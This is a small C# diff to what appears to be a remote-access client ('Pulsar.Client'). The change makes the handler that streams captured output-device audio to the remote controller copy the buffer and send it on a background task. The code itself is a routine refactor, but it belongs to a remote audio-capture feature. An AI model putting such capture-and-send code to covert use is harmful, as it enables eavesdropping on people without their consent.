@@ -7,6 +7,7 @@ using Pulsar.Common.Networking;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Pulsar.Client.Messages
@@ -80,20 +81,26 @@ namespace Pulsar.Client.Messages
 
         private void sourcestream_DataAvailable(object sender, WaveInEventArgs e)
         {
-            byte[] rawAudio = e.Buffer;
-            try
+            byte[] bufferCopy = new byte[e.BytesRecorded];
+            Array.Copy(e.Buffer, bufferCopy, e.BytesRecorded);
+
+            Task.Run(() =>
             {
-                _client.Send(new GetOutputResponse
+                try
                 {
-                    Audio = rawAudio,
-                    Device = _deviceID
-                });
-            }
-            catch (Exception ex)
-            {
-                OnReport($"Error sending audio data: {ex.Message}");
-            }
+                    _client.Send(new GetOutputResponse
+                    {
+                        Audio = bufferCopy,
+                        Device = _deviceID
+                    });
+                }
+                catch (Exception ex)
+                {
+                    OnReport($"Error sending audio data: {ex.Message}");
+                }
+            });
         }
+
 
         private void Execute(ISender client, GetOutputDevice message)
         {
